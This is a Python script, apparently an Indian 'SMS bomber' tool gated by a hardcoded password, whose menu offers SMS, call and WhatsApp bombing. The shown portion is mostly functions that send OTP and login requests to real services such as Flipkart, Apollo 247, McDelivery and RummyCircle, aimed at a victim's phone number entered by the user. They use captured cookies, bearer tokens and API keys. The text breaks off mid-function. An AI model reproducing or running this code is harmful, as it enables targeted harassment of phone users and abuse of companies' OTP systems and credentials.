#!/usr/bin/env python
# coding: utf-8

# In[9]:


# scripted by samay
# Designed by vaimpier ritik 
# email thread shark 
# sms bomb script 
# 2021 


#--------imports 
import os
import sys
try:
    import colorama
    import requests

except ImportError:
    try:
        _ = os.system('pip install colorama' if os.name=='nt' else 'pip3 install colorama')
        _ = os.system('pip install requests' if os.name=='nt' else 'pip3 install requests')
    except:
        pass
import requests
from time import sleep
from colorama import Fore


#------------------------

#---------colors
r = "\\033[1;31m"
g = "\\033[1;32m"
y = "\\033[1;33m"
b = "\\033[1;34m"
d = "\\033[2;37m"
R = "\\033[1;41m"
Y = "\\033[1;43m"
B = "\\033[1;44m"
w = "\\033[1;37m"
g = "\\033[0;90m"
y = r

#--------functions and programs 

logo = '''
    \\033[1;31m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97        \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97
    \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
    \\033[0;90m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\\033[1;33m    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\033[1;33m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
    \\033[1;33m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;34m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
    \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91           \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
    \\033[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d           \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d    \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d
'''

def banner():
    print(logo)

def _under_():
    print('\
')

def bye():
    os.system('cls' if os.name=='nt' else 'clear')
    banner()
    string = """ 
    \\033[1;37mDeveloper  \\033[1;34m: \\033[1;31mVaimpier Ritik x sincryptzork x shark
    \\033[1;37mGithub     \\033[1;34m: \\033[1;31mVaimpierOfficial x Samay825 x shark
    \\033[1;37mInstagram  \\033[1;34m: \\033[1;31m@vaimpier_ritik x @sincryptzork x @0891322930
    """
    for letter in string:
        sleep(0.01) 
        sys.stdout.write(letter)
        sys.stdout.flush()
    print("\
")

def clear():
    _ = os.system('cls' if os.name=='nt' else 'clear')
    
def chutmarike(datasl):
    print(r+"\xe2\x94\x94\xe2\x94\x80> "+w+"\\033[1;37m"+datasl)

def front_interfere_look():
    clear()
    banner()
    bye()
    chutmarike('[ 1 ] Blackhat x Sms :')
    chutmarike('[ 2 ] Blackhat x Call :')
    chutmarike('[ 3 ] Blackhat x Sms2 :')
    chutmarike('[ 4 ] Blackhat x Custom Sms :')
    chutmarike('[ 5 ] Blackhat x Whatsapp Bomber :')
    chutmarike('[ 6 ] Blackhat x Update :')
    chutmarike('[ 7 ] Blackhat x Exit :')
    _under_()
    
#-------------------v
'''
os.system('whoami > samay.txt')

with open('samay.txt','r') as file:
    data = file.read()

try:
    okstt = data.split()[0]
    if okstt=='u0_a1622':
        os.remove('samay.txt')
        pass
    else:
        _under_()
        chutmarike('You are not premium user ..')
        os.remove('samay.txt')
        _under_()
        sys.exit()
    
    
except:
    sys.exit()'''

def _cls_front_under():
    clear()
    banner()
    _under_()

_cls_front_under()
    
#---------------object oriented programming 


class Samay:
    def __init__(self,_user_com,_user2):
        self.data = _user_com
        self.data2 = _user2
    def Passwordencrypt(self):
        if self.data=='vaimsamay123' and self.data2=='vaimzork123':
            front_interfere_look()
            try:
                ops_under = int(input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Desire option : "+r))
            except:
                _under_()
                chutmarike('Please Write the number to select option ..')
                _under_()
                sys.exit()
            aayush = Mainscript(ops_under)
            aayush.scripting()
        else:
            chutmarike('Wrong Password please Wait ..')
            sleep(2.0)
            _cls_front_under()
            ok = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the username : "+r)
            ok1 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the password : "+r)
            sl = Samay(ok,ok1)
            sl.Passwordencrypt()
class Mainscript:
    def __init__(self,_sek_inp):
        self.data_main = _sek_inp
    def scripting(self):
        if self.data_main==1:
            _cls_front_under()
            number = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number+r)
            
            def simplehacker():
                url877 = f'https://simplehacker.pythonanywhere.com/sms/{number}'
                ousimple = requests.get(url877)
            
            def medbuzz():
                headers455 = {
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'Connection': 'keep-alive',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'DNT': '1',
                    'Origin': 'https://www.medbuzz.in',
                    'Referer': 'https://www.medbuzz.in/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
                }

                json_data455 = {
                    'CountryCode': '+91',
                    'PhoneNumber': number,
                    'ApiKey': 'fbfc0125-fea6-4ab0-a919-fb01785c1457',
                    'USERID': '',
                    'SessionID': '',
                }
                response455 = requests.post('https://api.medbuzz.in/app/Generate_User_OTP', headers=headers455, json=json_data455)

            def apollo():
                headers555 = {
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'Connection': 'keep-alive',
                    'DNT': '1',
                    'Origin': 'https://www.apollopharmacy.in',
                    'Referer': 'https://www.apollopharmacy.in/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
                    'accept': '*/*',
                    'authorization': 'Bearer 3d1833da7020e0602165529446587434',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                }

                json_data555 = {
                    'operationName': 'Login',
                    'variables': {
                        'mobileNumber': f'+91{number}',
                        'loginType': 'PATIENT',
                    },
                    'query': 'query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\
  login(mobileNumber: $mobileNumber, loginType: $loginType) {\
    status\
    message\
    loginId\
    __typename\
  }\
}\
',
                }

                response555 = requests.post('https://webapi.apollo247.com/', headers=headers555, json=json_data555)

            def flipkart():
                cookies11 = {
                    'T': 'TI166051777263500361725355184726229621803065293637887642574388860456',
                    'SN': 'VI9F4398DB200245EFB45DDABB60763A5F.TOKE8F2773347064BEA8B89703E6443BE39.1660517772.LO',
                    'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C19219%7CMCMID%7C07813909948777340084014996032482903537%7CMCAID%7CNONE%7CMCOPTOUT-1660524980s%7CNONE',
                    'gpv_pn': 'HomePage',
                    'gpv_pn_t': 'FLIPKART%3AHomePage',
                    's_cc': 'true',
                    'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
                    'S': 'd1t12TBtWP3k/Nj8/Pwk/ez9CP9D4s238O0dIrFzOXUTD4a+KvuCEEYXRfJIjDkZEeirRSbBUlhNSy4yj5zq2U/tDGQ==',
                    's_sq': '%5B%5BB%5D%5D',
                }

                headers11 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'X-User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 FKUA/website/42/website/Desktop',
                    'Origin': 'https://www.flipkart.com',
                    'DNT': '1',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'Referer': 'https://www.flipkart.com/',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'T=TI166051777263500361725355184726229621803065293637887642574388860456; SN=VI9F4398DB200245EFB45DDABB60763A5F.TOKE8F2773347064BEA8B89703E6443BE39.1660517772.LO; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C19219%7CMCMID%7C07813909948777340084014996032482903537%7CMCAID%7CNONE%7CMCOPTOUT-1660524980s%7CNONE; gpv_pn=HomePage; gpv_pn_t=FLIPKART%3AHomePage; s_cc=true; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; S=d1t12TBtWP3k/Nj8/Pwk/ez9CP9D4s238O0dIrFzOXUTD4a+KvuCEEYXRfJIjDkZEeirRSbBUlhNSy4yj5zq2U/tDGQ==; s_sq=%5B%5BB%5D%5D',
                }

                json_data11 = {
                    'loginId': '',
                }

                json_data11['loginId'] = (f'+91{number}')
                
                response11 = requests.post('https://2.rome.api.flipkart.com/api/7/user/otp/generate', cookies=cookies11, headers=headers11, json=json_data11)
            
            
                
            def fastpronumber():
                cookies10 = {
                    'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
                    '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
                }

                headers10 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Cache-Control': 'max-age=0',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                params10 = {
                    'sr': number,
                    'key': '@itztktricks',
                    'submit': 'Submit Query',
                }
                
                #
                response10 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookies10, headers=headers10)
                
                
            def industrialapi():
                url = 'https://www.industrybuying.com'
                ol = requests.get(url).cookies
                lsp = ol['SERVER']
                cookies8 = {
                    'SERVER': lsp,
                    '_gid': 'GA1.2.1210481606.1660515269',
                    '_gat': '1',
                    '_gcl_au': '1.1.2042821914.1660515269',
                    'ib_referral': 'UTM',
                    'ib_utm_date_time': 'Mon Aug 15 2022 03:44:29 GMT+0530 (India Standard Time)',
                    'ib_utm_source': 'Affiliate',
                    'ib_utm_medium': 'icubeswire',
                    'ib_utm_campaign': '3881_',
                    'ib_activity_time': '8-15-2022 3:44:29',
                    'LONG_SESSION_ID': '3552db7a-245b-2da6-be4e-1698aca530f6',
                    '__sts': '{"sid":1660515270317,"tx":1660515270317,"url":"https%3A%2F%2Fwww.industrybuying.com%2F%3Futm_source%3DAffiliate%26utm_medium%3Dicubeswire%26utm_campaign%3D3881_","pet":1660515270317,"set":1660515270317}',
                    '__stp': '{"visit":"new","uuid":"74e35b34-b39f-44d7-84e3-fa54f411a210"}',
                    '_ga': 'GA1.1.132751137.1660515269',
                    '__stdf': '0',
                    '__stgeo': '"0"',
                    '__stbpnenable': '1',
                    '_fbp': 'fb.1.1660515271441.504963341',
                    '_hjSessionUser_2975779': 'eyJpZCI6IjVjZTM1MTY4LWVmOTQtNTQ4YS05ODY5LWI0ZTExM2ZiMWRkMCIsImNyZWF0ZWQiOjE2NjA1MTUyNzEzNTMsImV4aXN0aW5nIjpmYWxzZX0=',
                    '_hjFirstSeen': '1',
                    '_hjIncludedInSessionSample': '0',
                    '_hjSession_2975779': 'eyJpZCI6IjJmNzdlZGFjLWFmOWUtNGFlNC05YzI0LTk3MmI0MjY3YzJiMSIsImNyZWF0ZWQiOjE2NjA1MTUyNzIxODIsImluU2FtcGxlIjpmYWxzZX0=',
                    '__stat': '"BLOCK"',
                    '_ga_YCSK09WVKB': 'GS1.1.1660515271.1.0.1660515277.0',
                }

                headers8 = {
                    'authority': 'www.industrybuying.com',
                    'accept': '*/*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    # Requests sorts cookies= alphabetically
                    # 'cookie': 'SERVER=s1; _gid=GA1.2.1210481606.1660515269; _gat=1; _gcl_au=1.1.2042821914.1660515269; ib_referral=UTM; ib_utm_date_time=Mon Aug 15 2022 03:44:29 GMT+0530 (India Standard Time); ib_utm_source=Affiliate; ib_utm_medium=icubeswire; ib_utm_campaign=3881_; ib_activity_time=8-15-2022 3:44:29; LONG_SESSION_ID=3552db7a-245b-2da6-be4e-1698aca530f6; __sts={"sid":1660515270317,"tx":1660515270317,"url":"https%3A%2F%2Fwww.industrybuying.com%2F%3Futm_source%3DAffiliate%26utm_medium%3Dicubeswire%26utm_campaign%3D3881_","pet":1660515270317,"set":1660515270317}; __stp={"visit":"new","uuid":"74e35b34-b39f-44d7-84e3-fa54f411a210"}; _ga=GA1.1.132751137.1660515269; __stdf=0; __stgeo="0"; __stbpnenable=1; _fbp=fb.1.1660515271441.504963341; _hjSessionUser_2975779=eyJpZCI6IjVjZTM1MTY4LWVmOTQtNTQ4YS05ODY5LWI0ZTExM2ZiMWRkMCIsImNyZWF0ZWQiOjE2NjA1MTUyNzEzNTMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2975779=eyJpZCI6IjJmNzdlZGFjLWFmOWUtNGFlNC05YzI0LTk3MmI0MjY3YzJiMSIsImNyZWF0ZWQiOjE2NjA1MTUyNzIxODIsImluU2FtcGxlIjpmYWxzZX0=; __stat="BLOCK"; _ga_YCSK09WVKB=GS1.1.1660515271.1.0.1660515277.0',
                    'dnt': '1',
                    'origin': 'https://www.industrybuying.com',
                    'referer': 'https://www.industrybuying.com/?utm_source=Affiliate&utm_medium=icubeswire&utm_campaign=3881_',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                    'x-requested-with': 'XMLHttpRequest',
                }

                data8 = {
                    'username': number,
                }
                response8 = requests.post('https://www.industrybuying.com/user/api/send-otp/', cookies=cookies8, headers=headers8, data=data8)


            def snapmint():
                headers7 = {
                    'authority': 'api.snapmint.com',
                    'accept': '*/*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://snapmint.com',
                    'referer': 'https://snapmint.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                }

                json_data7 = {
                    'mobile': number,
                }
                response7 = requests.post('https://api.snapmint.com/v1/public/sign_up', headers=headers7, json=json_data7)

            def rummytime():
                headers6 = {
                    'authority': 'api.rummytime.com',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'content-type': 'application/json;charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://www.rummytime.com',
                    'referer': 'https://www.rummytime.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                }

                json_data6 = {
                    'mobile': number,
                }
                response6 = requests.post('https://api.rummytime.com/api/user/sendAppDownloadLink', headers=headers6, json=json_data6)

            def rummyapi():
                cookies5 = {
                    'sameSiteNoneSupported': 'true',
                    'LONG_VISITOR': '2787e267-cbdf-4032-8f2d-9645fb1cfec1',
                    'device.info.cookie': '{"bv":"104.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}',
                    'SSID': 'SSID4b721211-5179-48db-9ca2-8cedf600d5c8',
                    'SSIDuser': 'SSID4b721211-5179-48db-9ca2-8cedf600d5c8%3A0',
                    'ga24x7_pixeltracker': 'from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F',
                    '__utma': '3588915.1172103635.1660514286.1660514286.1660514286.1',
                    '__utmc': '3588915',
                    '__utmz': '3588915.1660514286.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
                    '__utmt_pageTracker': '1',
                    '__utmb': '3588915.1.10.1660514286',
                    'NA_IDVISIT': '0d7937d9-8dd9-4bf5-95f5-20f4943a0537',
                    'NA_VISITOR': '0d7937d9-8dd9-4bf5-95f5-20f4943a0537',
                    'isLivechat': '0',
                    'ga24x7_jsessionid': '"SSID4b721211-5179-48db-9ca2-8cedf600d5c8,, "',
                    'hash_parameter': '0',
                    'AWSALB': 'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g',
                    'AWSALBCORS': 'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g',
                    '_ga': 'GA1.2.1172103635.1660514286',
                    '_gid': 'GA1.2.482317890.1660514290',
                    '_gat_UA-3610156-1': '1',
                }

                headers5 = {
                    'authority': 'www.rummycircle.com',
                    'accept': '*/*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'cache-control': 'max-age=0',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                    # Requests sorts cookies= alphabetically
                    # 'cookie': 'sameSiteNoneSupported=true; LONG_VISITOR=2787e267-cbdf-4032-8f2d-9645fb1cfec1; device.info.cookie={"bv":"104.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}; SSID=SSID4b721211-5179-48db-9ca2-8cedf600d5c8; SSIDuser=SSID4b721211-5179-48db-9ca2-8cedf600d5c8%3A0; ga24x7_pixeltracker=from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F; __utma=3588915.1172103635.1660514286.1660514286.1660514286.1; __utmc=3588915; __utmz=3588915.1660514286.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt_pageTracker=1; __utmb=3588915.1.10.1660514286; NA_IDVISIT=0d7937d9-8dd9-4bf5-95f5-20f4943a0537; NA_VISITOR=0d7937d9-8dd9-4bf5-95f5-20f4943a0537; isLivechat=0; ga24x7_jsessionid="SSID4b721211-5179-48db-9ca2-8cedf600d5c8,, "; hash_parameter=0; AWSALB=twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g; AWSALBCORS=twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g; _ga=GA1.2.1172103635.1660514286; _gid=GA1.2.482317890.1660514290; _gat_UA-3610156-1=1',
                    'dnt': '1',
                    'origin': 'https://www.rummycircle.com',
                    'referer': 'https://www.rummycircle.com/',
                    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
                }

                json_data5 = {
                    'mobile': number,
                    'deviceId': 'ff2e30c7-0998-42c7-b2a7-4293c38bb040',
                    'deviceName': '',
                    'refCode': '',
                    'isPlaycircle': False,
                }
                response5 = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', cookies=cookies5, headers=headers5, json=json_data5)



            def nira():
                headers4 = {
                    'authority': '63ti5s0o80.execute-api.ap-south-1.amazonaws.com',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://apply.nirafinance.com',
                    'referer': 'https://apply.nirafinance.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                }

                json_data4 = {
                    'mobileNumber': number,
                    'otp': '',
                }
                response4 = requests.post('https://63ti5s0o80.execute-api.ap-south-1.amazonaws.com/Prod/nirawebloginapi', headers=headers4, json=json_data4)



            def macdonal():
                headers3 = {
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'AddressID': '0',
                    'Authorization': 'Token 1e32549b6d6054059d8447d12be42612e31ac6f4af1155473ceb5e940d23649d',
                    'BusinessModelID': '18',
                    'CartID': '0',
                    'Connection': 'keep-alive',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'CustomerID': '-1',
                    'DNT': '1',
                    'OrderTime': '0',
                    'OrderType': 'R',
                    'Origin': 'https://www.mcdelivery.co.in',
                    'PlatForm': 'msite',
                    'Referer': 'https://www.mcdelivery.co.in/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'Storeid': '1',
                    'TokenTimestamp': '150820220314',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
                    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5Njk0NDQiLCJhcCI6Ijc1NDEzMDQzNCIsImlkIjoiMDA2YjEwMDQwMzAyMDVlNSIsInRyIjoiMDBjZmQyMGQ1NzgxODJlYjU4MTBjNWMxMmI5NDZkNzAiLCJ0aSI6MTY2MDUxMzQ1MTk5NH19',
                    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'source': 'Web',
                }




                params3 = {
                    'isLoggedIn': 'false',
                    'businessModelID': '18',
                    'storeID': '1',
                }

                json_data3 = {
                    'MobileNo': number,
                }
                response3 = requests.post('https://services.mcdelivery.co.in/api/auth/sendotp', params=params3, headers=headers3, json=json_data3)

            def jeet():
                headers2 = {
                    'authority': 'api.jeet11.com',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://www.jeet11.com',
                    'referer': 'https://www.jeet11.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
                    'x-client-app-type': 'JEET11',
